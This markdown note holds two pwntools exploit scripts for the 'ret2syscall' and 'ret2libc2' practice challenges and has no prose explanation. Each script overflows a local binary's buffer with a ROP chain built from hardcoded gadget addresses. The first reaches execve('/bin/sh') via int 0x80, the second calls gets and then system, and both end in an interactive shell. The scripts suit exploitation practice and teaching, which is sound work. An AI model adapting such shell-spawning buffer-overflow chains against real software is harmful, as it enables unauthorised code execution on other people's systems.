# ret2syscall
```python
from pwn import *

p=process('./rop')
binsh=0x80be408
eax_addr=0x80bb196
ecx_addr=0x806eb91
edx_addr=0x806eb6a
int_addr=0x8049421

pay=flat(['a'*112,eax_addr,0xb,ecx_addr,0,binsh,edx_addr,0,int_addr])

p.sendline(pay)
p.interactive()
```

# ret2libc2
```python
from pwn import *
p=process('./ret2libc2')

buf2=0x804A080
popebx=0x804843d
sys_addr=0x8048490
get_addr=0x08048460

pay=flat(['a'*112,get_addr,popebx,buf2,sys_addr,'a'*4,buf2])

p.sendline(pay)
p.sendline('/bin/sh/')
p.interactive()
```
<!--stackedit_data:
eyJoaXN0b3J5IjpbMTM5NzIzNTQ1OV19
-->